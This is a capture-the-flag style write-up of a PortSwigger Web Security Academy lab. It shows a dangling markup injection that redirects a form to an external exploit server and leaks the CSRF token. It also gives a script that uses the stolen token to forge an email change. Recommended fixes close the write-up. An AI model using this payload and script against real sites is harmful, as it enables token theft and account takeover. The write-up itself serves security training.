## Lab Title: Reflected XSS protected by very strict CSP, with dangling markup attack  

- **Category:** Cross-Site Scripting / CSP Bypass  
- **Level:** Practitioner  
- **Platform:** PortSwigger Web Security Academy  

## Overview  
This lab demonstrates how attackers can exploit reflected XSS even when a strict Content Security Policy (CSP) is in place. By using a dangling markup attack, it is possible to hijack form submissions, exfiltrate CSRF tokens, and perform unauthorized actions such as changing a victim’s email address.  

## Vulnerability Context  
- **Entry Point:** `email` query parameter in the account page URL.  
- **Reflection Point:** Inside the account page’s HTML structure.  
- **Impact:** Arbitrary injection of HTML elements into the DOM.  
- **Security Weakness:** Strict CSP blocks inline scripts and external resources, but does not restrict `form-action`. This allows attackers to redirect form submissions to external servers.  

## Exploit Technique  
The attack proceeds in stages:  
1. **Bypass client-side validation:** Embed payloads inside a valid email format to pass checks.  
2. **Inject dangling markup:** Close the email attribute with a quotation mark and inject a `<button>` element.  
3. **Hijack form submission:** Use the `formaction` attribute to redirect submissions to the exploit server.  
4. **Exfiltrate CSRF token:** Add `formmethod="get"` so the CSRF token is included in the URL query string.  
5. **Automate attack:** On the exploit server, use JavaScript to parse the CSRF token and submit a forged POST request to change the victim’s email to `hacker@evil-user.net`.  

**Figure 1: Embed payloads inside a valid email format to pass checks.**

<img width="940" height="357" alt="image" src="https://github.com/user-attachments/assets/660a7c1a-bfd4-449e-a3b4-8a2179516675" />

---

**Figure 2: Close the email attribute with a quotation mark and inject a `<button>` element.**

<img width="1153" height="344" alt="image" src="https://github.com/user-attachments/assets/740b9d41-2b13-42f4-8931-e346c838c0d1" />

---

### Example Injection  
```html
foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
```

**Figure 3: Confirming injected button appears on the page labeled “Click me.**

<img width="1077" height="568" alt="image" src="https://github.com/user-attachments/assets/4714b90b-865c-492f-a958-6dbf81b0f273" />

- The injected button appears on the page labeled “Click me.”
- When clicked, the form submits to the exploit server with the CSRF token in the URL.
- The exploit server script captures the token and uses it to send a forged request.

---

**Figure 4: Exploit server with the CSRF token in the URL.**

<img width="1144" height="247" alt="image" src="https://github.com/user-attachments/assets/fe9e165d-d678-4d94-9f69-a0e1c1128256" />

---

## Exploit Server Script
```html
<body>
<script>
const academyFrontend = "https://YOUR-LAB-ID.web-security-academy.net/";
const exploitServer = "https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit";

const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
  const form = document.createElement('form');
  const email = document.createElement('input');
  const token = document.createElement('input');

  token.name = 'csrf';
  token.value = csrf;
  email.name = 'email';
  email.value = 'hacker@evil-user.net';

  form.method = 'post';
  form.action = `${academyFrontend}my-account/change-email`;
  form.append(email);
  form.append(token);
  document.documentElement.append(form);
  form.submit();
} else {
  location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```
---

**Figure 5: Constructing the malicious dangling markup link on the external exploit server to bypass strict CSP restrictions.**

<img width="1158" height="546" alt="image" src="https://github.com/user-attachments/assets/7117f855-aade-47fa-96ee-1e2adbdf3d2c" />

## Verification

- Injected the payload via the email parameter.
- Observed the “Click me” button rendered on the page.
- Clicking the button redirected to the exploit server with the CSRF token in the URL.

The exploit server script submitted a forged request, successfully changing the victim’s email to hacker@evil-user.net.

---

**Figure 6: Exfiltrating the captured victim credentials directly to the malicious exploit server logs via the dangling markup injection.**

<img width="948" height="337" alt="image" src="https://github.com/user-attachments/assets/1df96412-3438-4d98-a53d-fe11a2b5036f" />

---

**Figure 7: Verifying successful exploitation and data exfiltration through the exploit server, confirming completion of the lab.**

<img width="1163" height="567" alt="image" src="https://github.com/user-attachments/assets/3d9f968b-9125-4ff1-8262-fc7d4b6cda7c" />

---

## Security Impact

- CSP Bypass: Attackers can exploit missing form-action restrictions.
- CSRF Token Theft: Tokens can be exfiltrated via GET requests.
- Account Manipulation: Victim’s email address is changed without consent.

## Recommended Fixes

- Implement strict CSP including form-action 'self'.
- Encode and sanitize all user input before rendering.
- Avoid reflecting unsanitized query parameters into HTML.
- Apply defense‑in‑depth measures such as SameSite cookies and CSRF double‑submit tokens.

## Lessons Learned

This lab highlights how CSP must be carefully configured. Even with strict script blocking, overlooked directives like form-action can leave applications vulnerable. Dangling markup attacks show that attackers can pivot from XSS to CSRF token theft and account manipulation.
